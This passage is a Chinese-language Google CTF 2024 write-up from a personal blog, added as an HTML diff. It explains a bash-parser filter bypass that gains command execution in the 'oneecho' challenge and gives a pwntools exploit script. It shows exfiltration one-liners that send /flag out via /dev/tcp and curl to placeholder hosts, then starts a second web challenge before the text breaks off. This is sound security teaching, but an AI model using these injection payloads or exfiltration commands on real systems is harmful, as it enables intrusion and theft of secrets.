@@ -1,0 +1,690 @@
+<!doctype html><html><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="ie=edge"><meta http-equiv=accept-ch content="DPR, Viewport-Width, Width"><link rel=icon href=/myfav.png type=image/gif><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=preload as=style href="https://fonts.googleapis.com/css2?family=Alata&family=Lora:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Alata&family=Lora:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" media=print onload="this.media='all'"><noscript><link href="https://fonts.googleapis.com/css2?family=Alata&family=Lora:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel=stylesheet></noscript><link rel=stylesheet href=/css/font.css media=all><meta property="og:title" content="Google CTF 2024 WriteUp"><meta property="og:description" content="Google CTF 2024 WriteUp 戰績 oneecho 概述 nc 進去是一個可以讓你下指令的 shell
+然而只能下 echo 不能下其他的，目測要 command injection
+到 challenge.js 來看看他怎檔的。
+首先他 require 了 bash-parser
+const parse = require('bash-parser'); 接著他把指令 parse 成 ast
+const ast = parse(cmd); call check 做檢查
+if (!check(ast)) ( rl.write('Hacker detected! No hacks, only echo!'); rl.close(); return; } 來看看他怎麼檢查的。
+const check = ast => { if (typeof(ast) === 'string') { return true; } for (var prop in ast) { if (prop === 'type' && ast[prop] === 'Redirect') { return false; } if (prop === 'type' && ast[prop] === 'Command') { if (ast['name'] && ast['name']['text'] && ast['name']['text'] !"><meta property="og:type" content="article"><meta property="og:url" content="https://hugo-profile.netlify.app/blogs/google-ctf-2024/"><meta property="article:published_time" content="2024-06-24T03:00:00+08:00"><meta property="article:modified_time" content="2024-06-24T03:00:00+08:00"><meta property="og:site_name" content="Chumy's Blog"><meta name=twitter:card content="summary"><meta name=twitter:title content="Google CTF 2024 WriteUp"><meta name=twitter:description content="Google CTF 2024 WriteUp 戰績 oneecho 概述 nc 進去是一個可以讓你下指令的 shell
+然而只能下 echo 不能下其他的，目測要 command injection
+到 challenge.js 來看看他怎檔的。
+首先他 require 了 bash-parser
+const parse = require('bash-parser'); 接著他把指令 parse 成 ast
+const ast = parse(cmd); call check 做檢查
+if (!check(ast)) ( rl.write('Hacker detected! No hacks, only echo!'); rl.close(); return; } 來看看他怎麼檢查的。
+const check = ast => { if (typeof(ast) === 'string') { return true; } for (var prop in ast) { if (prop === 'type' && ast[prop] === 'Redirect') { return false; } if (prop === 'type' && ast[prop] === 'Command') { if (ast['name'] && ast['name']['text'] && ast['name']['text'] !"><link rel=stylesheet href=/bootstrap-5/css/bootstrap.min.css media=all><link rel=stylesheet href=/css/header.css media=all><link rel=stylesheet href=/css/footer.css media=all><link rel=stylesheet href=/css/theme.css media=all><style>:root{--text-color: #343a40;--text-secondary-color: #6c757d;--background-color: #eaedf0;--secondary-background-color: #64ffda1a;--primary-color: #007bff;--secondary-color: #f8f9fa;--text-color-dark: #e4e6eb;--text-secondary-color-dark: #b0b3b8;--background-color-dark: #18191a;--secondary-background-color-dark: #212529;--primary-color-dark: #ffffff;--secondary-color-dark: #212529}body{font-size:1rem;font-weight:400;line-height:1.5;text-align:left}html{background-color:var(--background-color)!important}body::-webkit-scrollbar{width:.5em;height:.5em;background-color:var(--background-color)}::-webkit-scrollbar-track{box-shadow:inset 0 0 6px var(--background-color);border-radius:1rem}::-webkit-scrollbar-thumb{border-radius:1rem;background-color:var(--secondary-color);outline:1px solid var(--background-color)}#search-content::-webkit-scrollbar{width:.5em;height:.1em;background-color:var(--background-color)}</style><meta name=description content><link rel=stylesheet href=/css/single.css><script defer src=/fontawesome-5/all-5.15.4.js></script><title>Google CTF 2024 WriteUp | Chumy's Blog</title></head><body class=light><script>let localStorageValue=localStorage.getItem("pref-theme");let mediaQuery=window.matchMedia('(prefers-color-scheme: dark)').matches;switch(localStorageValue){case "dark":document.body.classList.add('dark');break;case "light":document.body.classList.remove('dark');break;default:if(mediaQuery){document.body.classList.add('dark');}
+break;}</script><header><nav class="pt-3 navbar navbar-expand-lg animate"><div class="container-fluid mx-xs-2 mx-sm-5 mx-md-5 mx-lg-5"><a class="navbar-brand primary-font text-wrap" href=/><img src=/myfav.png width=30 height=30 class="d-inline-block align-top">
+Chumy's Blog</a><div><input id=search autocomplete=off class="form-control mr-sm-2 d-none d-md-block" placeholder="Ctrl + k" aria-label=Search oninput=searchOnChange(event)></div><button class=navbar-toggler type=button data-bs-toggle=collapse data-bs-target=#navbarContent aria-controls=navbarContent aria-expanded=false aria-label="Toggle navigation"><svg aria-hidden="true" height="24" viewBox="0 0 16 16" width="24" data-view-component="true"><path fill-rule="evenodd" d="M1 2.75A.75.75.0 011.75 2h12.5a.75.75.0 110 1.5H1.75A.75.75.0 011 2.75zm0 5A.75.75.0 011.75 7h12.5a.75.75.0 110 1.5H1.75A.75.75.0 011 7.75zM1.75 12a.75.75.0 100 1.5h12.5a.75.75.0 100-1.5H1.75z"/></svg></button><div class="collapse navbar-collapse text-wrap primary-font" id=navbarContent><ul class="navbar-nav ms-auto text-center"><li class="nav-item navbar-text d-block d-md-none"><div class=nav-link><input id=search autocomplete=off class="form-control mr-sm-2" placeholder="Ctrl + k" aria-label=Search oninput=searchOnChange(event)></div></li><li class="nav-item navbar-text"><a class=nav-link href=/#about aria-label=about>About Me</a></li><li class="nav-item navbar-text"><a class=nav-link href=/#experience aria-label=experience>Experience</a></li><li class="nav-item navbar-text"><a class=nav-link href=/#education aria-label=education>Education</a></li><li class="nav-item navbar-text"><a class=nav-link href=/#projects aria-label=projects>Projects</a></li><li class="nav-item navbar-text"><a class=nav-link href=/#contact aria-label=contact>Contact</a></li><li class="nav-item navbar-text"><a class=nav-link href=/blogs title="Blog posts">Blog</a></li><li class="nav-item navbar-text"><a class=nav-link href=/gallery title="Blog posts">Gallery</a></li><li class="nav-item navbar-text"><a class=nav-link href=/cv.pdf title=CV>CV</a></li><li class="nav-item navbar-text"><div class=text-center><button id=theme-toggle><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></li></ul></div></div></nav></header><div id=content><section id=single><div class=container><div class="row justify-content-center"><div class="col-sm-12 col-md-12 col-lg-9"><div class=pr-lg-4><div class="title mb-5"><h1 class="text-center mb-4">Google CTF 2024 WriteUp</h1><div class=text-center>Chumy
+<small>|</small>
+Jun 24, 2024
+<span id=readingTime>min read</span></div></div><div class=featured-image><img class=img-fluid src=/images/CTF.png alt="Google CTF 2024 WriteUp"></div><article class="page-content p-2"><h1 id=google-ctf-2024-writeup>Google CTF 2024 WriteUp</h1><h2 id=戰績>戰績</h2><p><img src=https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/102ab7a2-a951-47de-9dfa-5732cb2cc83a alt=image></p><p><img src=https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/225aff8b-6771-4163-8635-fe91b0cbc17e alt=image></p><h2 id=oneecho>oneecho</h2><p><img src=https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/d55e3843-2a4a-4b99-8fea-b46791dbec0d alt=image></p><h3 id=概述>概述</h3><p><code>nc</code> 進去是一個可以讓你下指令的 shell</p><p><img src=https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/c11bebbe-800a-47c0-a3aa-72e693661878 alt=image></p><p>然而只能下 <code>echo</code> 不能下其他的，目測要 command injection</p><p><img src=https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/4a39314d-020c-4a20-a70c-edb727830d2e alt=image></p><p>到 <code>challenge.js</code> 來看看他怎檔的。</p><p>首先他 require 了 <code>bash-parser</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>parse</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;bash-parser&#39;</span>); 
+</code></pre></div><p>接著他把指令 parse 成 ast</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>ast</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>parse</span>(<span style=color:#a6e22e>cmd</span>);
+</code></pre></div><p>call <code>check</code> 做檢查</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>check</span>(<span style=color:#a6e22e>ast</span>)) (
+  <span style=color:#a6e22e>rl</span>.<span style=color:#a6e22e>write</span>(<span style=color:#e6db74>&#39;Hacker detected! No hacks, only echo!&#39;</span>);
+  <span style=color:#a6e22e>rl</span>.<span style=color:#a6e22e>close</span>();
+  <span style=color:#66d9ef>return</span>;
+}
+</code></pre></div><p>來看看他怎麼檢查的。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>check</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>ast</span> =&gt; {
+  <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>typeof</span>(<span style=color:#a6e22e>ast</span>) <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;string&#39;</span>) {
+    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
+  }
+  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>prop</span> <span style=color:#66d9ef>in</span> <span style=color:#a6e22e>ast</span>) {
+    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>prop</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;type&#39;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>ast</span>[<span style=color:#a6e22e>prop</span>] <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;Redirect&#39;</span>) {
+      <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+    }
+    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>prop</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;type&#39;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>ast</span>[<span style=color:#a6e22e>prop</span>] <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;Command&#39;</span>) {
+      <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>ast</span>[<span style=color:#e6db74>&#39;name&#39;</span>] <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>ast</span>[<span style=color:#e6db74>&#39;name&#39;</span>][<span style=color:#e6db74>&#39;text&#39;</span>] <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>ast</span>[<span style=color:#e6db74>&#39;name&#39;</span>][<span style=color:#e6db74>&#39;text&#39;</span>] <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;echo&#39;</span>) {
+        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+      }
+    }
+    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>check</span>(<span style=color:#a6e22e>ast</span>[<span style=color:#a6e22e>prop</span>])) {
+      <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+    }
+  }
+  <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
+};
+</code></pre></div><p>然後用 <a href=https://vorpaljs.github.io/bash-parser-playground/>bash-parser-playground</a> 看看 ast 的結構。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
+  <span style=color:#f92672>&#34;type&#34;</span>: <span style=color:#e6db74>&#34;Script&#34;</span>,
+  <span style=color:#f92672>&#34;commands&#34;</span>: [
+    {
+      <span style=color:#f92672>&#34;type&#34;</span>: <span style=color:#e6db74>&#34;Command&#34;</span>,
+      <span style=color:#f92672>&#34;name&#34;</span>: {
+        <span style=color:#f92672>&#34;text&#34;</span>: <span style=color:#e6db74>&#34;echo&#34;</span>,
+        <span style=color:#f92672>&#34;type&#34;</span>: <span style=color:#e6db74>&#34;Word&#34;</span>
+      },
+      <span style=color:#f92672>&#34;suffix&#34;</span>: [
+        {
+          <span style=color:#f92672>&#34;text&#34;</span>: <span style=color:#e6db74>&#34;aaa&#34;</span>,
+          <span style=color:#f92672>&#34;type&#34;</span>: <span style=color:#e6db74>&#34;Word&#34;</span>
+        }
+      ]
+    },
+    {
+      <span style=color:#f92672>&#34;type&#34;</span>: <span style=color:#e6db74>&#34;LogicalExpression&#34;</span>,
+      <span style=color:#f92672>&#34;op&#34;</span>: <span style=color:#e6db74>&#34;and&#34;</span>,
+      <span style=color:#f92672>&#34;left&#34;</span>: {
+        <span style=color:#f92672>&#34;type&#34;</span>: <span style=color:#e6db74>&#34;Command&#34;</span>,
+        <span style=color:#f92672>&#34;name&#34;</span>: {
+          <span style=color:#f92672>&#34;text&#34;</span>: <span style=color:#e6db74>&#34;ls&#34;</span>,
+          <span style=color:#f92672>&#34;type&#34;</span>: <span style=color:#e6db74>&#34;Word&#34;</span>
+        },
+        <span style=color:#f92672>&#34;suffix&#34;</span>: [
+          {
+            <span style=color:#f92672>&#34;text&#34;</span>: <span style=color:#e6db74>&#34;aaa&#34;</span>,
+            <span style=color:#f92672>&#34;type&#34;</span>: <span style=color:#e6db74>&#34;Word&#34;</span>
+          }
+        ]
+      },
+      <span style=color:#f92672>&#34;right&#34;</span>: {
+        <span style=color:#f92672>&#34;type&#34;</span>: <span style=color:#e6db74>&#34;Pipeline&#34;</span>,
+        <span style=color:#f92672>&#34;commands&#34;</span>: [
+          {
+            <span style=color:#f92672>&#34;type&#34;</span>: <span style=color:#e6db74>&#34;Command&#34;</span>,
+            <span style=color:#f92672>&#34;name&#34;</span>: {
+              <span style=color:#f92672>&#34;text&#34;</span>: <span style=color:#e6db74>&#34;ls&#34;</span>,
+              <span style=color:#f92672>&#34;type&#34;</span>: <span style=color:#e6db74>&#34;Word&#34;</span>
+            },
+            <span style=color:#f92672>&#34;suffix&#34;</span>: [
+              {
+                <span style=color:#f92672>&#34;text&#34;</span>: <span style=color:#e6db74>&#34;bbb$(ls ddd)&#34;</span>,
+                <span style=color:#f92672>&#34;expansion&#34;</span>: [
+                  {
+                    <span style=color:#f92672>&#34;loc&#34;</span>: {
+                      <span style=color:#f92672>&#34;start&#34;</span>: <span style=color:#ae81ff>3</span>,
+                      <span style=color:#f92672>&#34;end&#34;</span>: <span style=color:#ae81ff>11</span>
+                    },
+                    <span style=color:#f92672>&#34;command&#34;</span>: <span style=color:#e6db74>&#34;ls ddd&#34;</span>,
+                    <span style=color:#f92672>&#34;type&#34;</span>: <span style=color:#e6db74>&#34;CommandExpansion&#34;</span>,
+                    <span style=color:#f92672>&#34;commandAST&#34;</span>: {
+                      <span style=color:#f92672>&#34;type&#34;</span>: <span style=color:#e6db74>&#34;Script&#34;</span>,
+                      <span style=color:#f92672>&#34;commands&#34;</span>: [
+                        {
+                          <span style=color:#f92672>&#34;type&#34;</span>: <span style=color:#e6db74>&#34;Command&#34;</span>,
+                          <span style=color:#f92672>&#34;name&#34;</span>: {
+                            <span style=color:#f92672>&#34;text&#34;</span>: <span style=color:#e6db74>&#34;ls&#34;</span>,
+                            <span style=color:#f92672>&#34;type&#34;</span>: <span style=color:#e6db74>&#34;Word&#34;</span>
+                          },
+                          <span style=color:#f92672>&#34;suffix&#34;</span>: [
+                            {
+                              <span style=color:#f92672>&#34;text&#34;</span>: <span style=color:#e6db74>&#34;ddd&#34;</span>,
+                              <span style=color:#f92672>&#34;type&#34;</span>: <span style=color:#e6db74>&#34;Word&#34;</span>
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  }
+                ],
+                <span style=color:#f92672>&#34;type&#34;</span>: <span style=color:#e6db74>&#34;Word&#34;</span>
+              }
+            ]
+          },
+          {
+            <span style=color:#f92672>&#34;type&#34;</span>: <span style=color:#e6db74>&#34;Command&#34;</span>,
+            <span style=color:#f92672>&#34;name&#34;</span>: {
+              <span style=color:#f92672>&#34;text&#34;</span>: <span style=color:#e6db74>&#34;ls&#34;</span>,
+              <span style=color:#f92672>&#34;type&#34;</span>: <span style=color:#e6db74>&#34;Word&#34;</span>
+            },
+            <span style=color:#f92672>&#34;suffix&#34;</span>: [
+              {
+                <span style=color:#f92672>&#34;text&#34;</span>: <span style=color:#e6db74>&#34;ccc&#34;</span>,
+                <span style=color:#f92672>&#34;type&#34;</span>: <span style=color:#e6db74>&#34;Word&#34;</span>
+              }
+            ]
+          }
+        ]
+      }
+    }
+  ]
+}
+</code></pre></div><p>這邊試了部分 command injection 的手法，但可以看到都有成功辨識成 <code>Command</code>，而 <code>check</code> function 的檢查是 recursive 的，所以理論上上面的這些 payload 檢查都不會過。</p><h3 id=解題>解題</h3><p>首先再仔細看看 <code>check</code> function</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>prop</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;type&#39;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>ast</span>[<span style=color:#a6e22e>prop</span>] <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;Command&#39;</span>) {
+      <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>ast</span>[<span style=color:#e6db74>&#39;name&#39;</span>] <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>ast</span>[<span style=color:#e6db74>&#39;name&#39;</span>][<span style=color:#e6db74>&#39;text&#39;</span>] <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>ast</span>[<span style=color:#e6db74>&#39;name&#39;</span>][<span style=color:#e6db74>&#39;text&#39;</span>] <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;echo&#39;</span>) {
+        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+      }
+    }
+</code></pre></div><p>其中 <code>ast['name']['text']</code> 會有問題，由於 js week type 的特性，當字串為空值的時候會是 <code>false</code>，因此除了 command 為 echo 的指令以外 command 為空值的指令也能用。</p><p><img src=https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/f83386d9-1572-4520-816e-227a790e5dcd alt=image></p><p>那在何種情況 command 會是空值呢？這邊發現在定義 <code>environment variable</code> 的時候 command 會是空值。</p><p><img src=https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/793f7e9d-0597-462b-8b41-898f8dce1d83 alt=image></p><p>也就是說我們除了下 <code>echo</code> 以外也可以定義 <code>environment variable</code>，那這能做甚麼，這就能利用 bash 裡面 <code>Arithmetic Expansion</code> 也就是 <code>$((1+1))</code> 以及 array 也就是 <code>arr=(aa bb); echo ${arr[0]}</code> 這個兩個功能的特性。</p><p>首先 <code>Arithmetic Expansion</code> 裡面如果出現 variable 的話她會<strong>自動</strong>把 variable 內的表達式做展開，也就是 <code>test='1+1'; echo $((test+1))</code> 你會得到 <code>$(((1+1)+1))</code> 也就是 3。</p><p>再來 array 如果在 <code>Arithmetic Expansion</code> 內，並且她的 index 有 <code>command substitution</code> 也就是 <code>$()</code> 的話一樣會執行 command，也就是說 <code>arr=(1 2); echo $((arr[$(echo 1)]+1))</code> 這樣會得到 <code>$((arr[1]+1))</code> 展開後是 <code>$((2+1))</code> 也就是 3。</p><p>利用這兩點我們可以組合出這個 <code>payload='arr[$(RCE)]'; echo $(( payload == 1 ));</code> 再 <code>RCE</code> 的位置可以放任意指令並執行，這點我們可以用這個指令做測試 <code>arr='1' payload='arr[$(echo 0)]'; echo $(( payload == 1 ))</code></p><p><img src=https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/96e9b383-0109-4222-9fe2-d27e3f52a256 alt=image></p><p>但是用這種方式所造成的 RCE 沒辦法使用 STDOUT 輸出任何東西，因此要另外想回傳 flag 的方發，遠本試過用網路回傳如：<code>payload='arr[$(cat /flag > /dev/tcp/&lt;IP>/&lt;PORT>)]'; echo $(( payload == 1 ));</code> 或者 <code>payload='arr[$(curl &lt;URL>/$(cat /flag))]'; echo $(( payload == 1 ));</code> 等等方法，但都沒成功，於是我試架一次他的環境，發現他的環境沒有 <code>/dev</code> 然後我把 <code>nc</code> 放進去以後發現環境沒網路，所以沒辦法用網路傳 flag 回來。</p><p>最後發現他有 <code>/proc</code> 所以試著用 <code>payload='arr[$(cat /flag > /proc/$$/fd/1)]'; echo $(( payload == 1 ));</code> 不知道為何依然沒成功，後來我發現他的 nodejs 程式每次執行一定再 pid 1 所以我就用 <code>payload='arr[$(cat /flag > /proc/1/fd/1)]'; echo $(( payload == 1 ));</code> 就成功拿到 flag 了。</p><h3 id=exploit>exploit</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> pwn
+<span style=color:#f92672>import</span> base64
+<span style=color:#f92672>import</span> sys
+<span style=color:#f92672>import</span> subprocess
+
+r <span style=color:#f92672>=</span> pwn<span style=color:#f92672>.</span>remote(<span style=color:#e6db74>&#34;onlyecho.2024.ctfcompetition.com&#34;</span>, <span style=color:#ae81ff>1337</span>)
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>genpayload</span>(cmd):
+    <span style=color:#66d9ef>return</span> f<span style=color:#e6db74>&#34;payload=&#39;arr[$({cmd})]&#39;; echo $(( payload == 1 )); &#34;</span>
+
+sys<span style=color:#f92672>.</span>stdout<span style=color:#f92672>.</span>buffer<span style=color:#f92672>.</span>write(r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;) solve &#39;</span>))
+
+token <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
+sys<span style=color:#f92672>.</span>stdout<span style=color:#f92672>.</span>buffer<span style=color:#f92672>.</span>write(token)
+
+token <span style=color:#f92672>=</span> token<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>decode()
+
+r<span style=color:#f92672>.</span>sendline(subprocess<span style=color:#f92672>.</span>run(f<span style=color:#e6db74>&#39;bash -c &#34;python3 &lt;(curl -sSL https://goo.gle/kctf-pow) solve {token}&#34;&#39;</span>, shell<span style=color:#f92672>=</span>True, capture_output<span style=color:#f92672>=</span>True)<span style=color:#f92672>.</span>stdout<span style=color:#f92672>.</span>strip())
+
+sys<span style=color:#f92672>.</span>stdout<span style=color:#f92672>.</span>buffer<span style=color:#f92672>.</span>write(r<span style=color:#f92672>.</span>recvrepeat(timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>))
+
+r<span style=color:#f92672>.</span>sendline(genpayload(<span style=color:#e6db74>&#39;cat /flag &gt; /proc/1/fd/1&#39;</span>)<span style=color:#f92672>.</span>encode())
+
+sys<span style=color:#f92672>.</span>stdout<span style=color:#f92672>.</span>buffer<span style=color:#f92672>.</span>write(r<span style=color:#f92672>.</span>recvrepeat(timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>))
+</code></pre></div><h3 id=flag>Flag</h3><p><img src=https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/da8df9df-d116-4fd3-8704-363ae2931c8e alt=image></p><p><code>CTF{LiesDamnedLiesAndBashParsingDifferentials}</code></p><h2 id=grand-prix-heaven>grand prix heaven</h2><p><img src=https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/7570101d-444d-444f-b05e-72170b0b3698 alt=image></p><h3 id=概述-1>概述</h3><p>這題有個網頁</p><p><img src=https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/c534a673-d576-4aae-9acd-513b1fa7731a alt=image></p><p>可以 post 自己喜歡的車的圖片以及他的資訊，也可以用網址查看 post 後的車</p><p><img src=https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/85a74c69-789d-483a-99ad-aa6b43b63e5f alt=image></p><p><img src=https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/ec752fca-8fe5-4a61-8b37-835eaf467a3e alt=image></p><p>接著他有兩個 server，一個是網頁，另一個是 template server，都是 nodejs，首先看看首頁的後端程式，我們可以注意到所有的 frontend route 都會有一個 template pieces，接著 web server 會把這個 template pieces 用 <code>multipart/form-data</code> 送到 template server，然後 template server 會依照這個 list 組合成一個 html 並回傳，然後 web server 再回傳這個 html 給 client。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;/&#34;</span>, <span style=color:#66d9ef>async</span> (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+  <span style=color:#66d9ef>try</span> {
+    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>data</span> <span style=color:#f92672>=</span> {
+      <span style=color:#ae81ff>0</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;csp&#34;</span>,
+      <span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;head_end&#34;</span>,
+      <span style=color:#ae81ff>2</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;index&#34;</span>,
+      <span style=color:#ae81ff>3</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;footer&#34;</span>,
+    };
+    <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>needle</span>.<span style=color:#a6e22e>post</span>(
+      <span style=color:#a6e22e>TEMPLATE_SERVER</span>,
+      <span style=color:#a6e22e>data</span>,
+      { <span style=color:#a6e22e>multipart</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>true</span>, <span style=color:#a6e22e>boundary</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>BOUNDARY</span> },
+      <span style=color:#66d9ef>function</span> (<span style=color:#a6e22e>err</span>, <span style=color:#a6e22e>resp</span>, <span style=color:#a6e22e>body</span>) {
+        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>err</span>) <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> Error(<span style=color:#a6e22e>err</span>);
+        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>body</span>);
+      }
+    );
+  } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>e</span>) {
+    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>`ERROR IN /:\n</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>e</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>);
+    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>500</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;error&#34;</span> });
+  }
+});
+</code></pre></div><p>再來講講 template server，他有很多用來組合網頁的零件，其中 <code>apiparser</code> 跟 <code>mediaparser</code> 最有趣，他分別對應到 <code>apiparser.js</code> 與 <code>mediaparser.js</code> 這兩個都是用來處理如何顯示 post 後的車的頁面，其中 mediaparser 被棄用，再 web server 裡完全看不到他，我們來看看程式碼。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#a6e22e>addEventListener</span>(<span style=color:#e6db74>&#34;load&#34;</span>, (<span style=color:#a6e22e>event</span>) =&gt; {
+  <span style=color:#a6e22e>params</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>URLSearchParams</span>(window.<span style=color:#a6e22e>location</span>.<span style=color:#a6e22e>search</span>);
